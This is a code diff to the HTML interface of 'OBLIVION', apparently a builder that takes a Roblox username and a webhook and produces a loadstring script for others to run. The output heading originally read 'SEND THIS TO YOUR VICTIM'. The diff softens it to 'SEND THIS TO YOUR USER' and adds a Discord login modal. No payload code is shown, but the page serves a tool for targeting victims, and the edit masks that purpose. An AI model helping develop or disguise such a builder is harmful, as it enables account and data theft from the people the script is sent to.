@@ -14,12 +14,14 @@
         <header>
             <h1>OBLIVION</h1>
             <div class="header-glow"></div>
+            <!-- Sign In button (top-right) -->
+            <button id="signInBtn" class="sign-in-btn">SIGN IN</button>
         </header>
 
         <!-- Username -->
         <section class="input-section">
             <label>ROBLOX USERNAME</label>
-            <input type="text" id="username" placeholder="Your Username" />
+            <input type="text" id="username" placeholder="Tu usuario" />
         </section>
 
         <!-- Webhook -->
@@ -99,7 +101,7 @@
         </section>
 
         <!-- Short Loadstring -->
-        <section class="short-loadstring-section">
+        <section class="short-loadstring-section" id="shortLoadstringSection">
             <div class="short-header">
                 <div>
                     <h2>SHORT LOADSTRING</h2>
@@ -112,6 +114,10 @@
                     </div>
                 </div>
             </div>
+            <!-- Mensaje de bloqueo para invitados -->
+            <div id="guestLockMessage" class="guest-lock hidden">
+                ⚠️ This feature requires authentication. Please <strong>Sign In</strong> with Discord.
+            </div>
         </section>
 
         <!-- Generate Script -->
@@ -120,13 +126,30 @@
         <!-- Output Section (hidden initially) -->
         <section id="outputSection" class="hidden">
             <div class="output-header">
-                <h2>SEND THIS TO YOUR VICTIM</h2>
+                <h2>SEND THIS TO YOUR USER</h2>
                 <button id="copyBtn">COPY</button>
             </div>
             <div class="output-container">
                 <pre id="outputCode"></pre>
             </div>
         </section>
+    </div>
+
+    <!-- Modal de Login -->
+    <div id="loginModal" class="login-modal hidden">
+        <div class="login-modal-content">
+            <div class="login-modal-header">
+                <h2>Login</h2>
+                <button id="closeModalBtn" class="close-modal-btn">×</button>
+            </div>
+            <p class="login-modal-subtitle">Login with your Discord account to get started</p>
+            <button id="discordLoginBtn" class="login-btn discord-btn">
+                <span class="discord-icon">◆</span> Continue with Discord
+            </button>
+            <div class="login-divider">OR</div>
+            <button id="guestLoginBtn" class="login-btn guest-btn">Continue as Guest</button>
+            <p class="guest-hint">Random username · no account needed</p>
+        </div>
     </div>
 
     <script src="script.js"></script>
